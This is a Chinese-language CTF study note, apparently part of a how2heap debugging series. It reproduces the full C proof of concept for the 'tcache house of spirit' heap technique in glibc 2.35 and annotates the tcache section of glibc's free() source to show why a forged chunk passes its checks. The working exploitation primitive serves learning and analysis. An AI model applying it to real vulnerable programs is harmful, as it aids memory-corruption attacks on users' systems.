---
layout: single
title: "tcache_house_of_spirit"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "PWN"]
description: "记录 glibc 2.35 中 tcache_house_of_spirit 的源码分析与调试过程。"
source_folder: "PWN/Heap Exploitation/how2heap Debugging/2.35/tcache_house_of_spirit"
lang: zh-CN
excerpt: "记录 glibc 2.35 中 tcache_house_of_spirit 的源码分析与调试过程。"
---
{% raw %}

# POC

```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates the house of spirit attack on tcache.\n");
	printf("It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	printf("You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	printf("(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	printf("Ok. Let's start with the example!.\n\n");


	printf("Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	printf("Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //fake chunk region

	printf("This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
}
```

该利用通过在已知地址（地址结尾为0x08或）写size（tcache范围内，结尾为0x0001或0x0000，不检查inuse标志位，但会检查另外两个）伪造chunk，之后free该chunk，再次malloc即可扩大可写范围。

# free（tcache部分）源码

```
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)  //初始化，size大小检查
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache_key))   //key检查
	  {
	    tcache_entry *tmp;
	    size_t cnt = 0;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = REVEAL_PTR (tmp->next), ++cnt)
		 //遍历对应size的tcache链表，检查是否重复分配，总数量超过限制，地址是否0x10对齐
	      {
		if (cnt >= mp_.tcache_count)
		  malloc_printerr ("free(): too many chunks detected in tcache");
		if (__glibc_unlikely (!aligned_OK (tmp)))
		  malloc_printerr ("free(): unaligned chunk detected in tcache 2");
		if (tmp == e)
		  malloc_printerr ("free(): double free detected in tcache 2");
		/* If we get here, it was a coincidence.  We've wasted a
		   few cycles, but don't abort.  */
	      }
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

可以看到，该部分检查只检查被free的chunk和链表，而不对next chunk做任何检查。
{% endraw %}
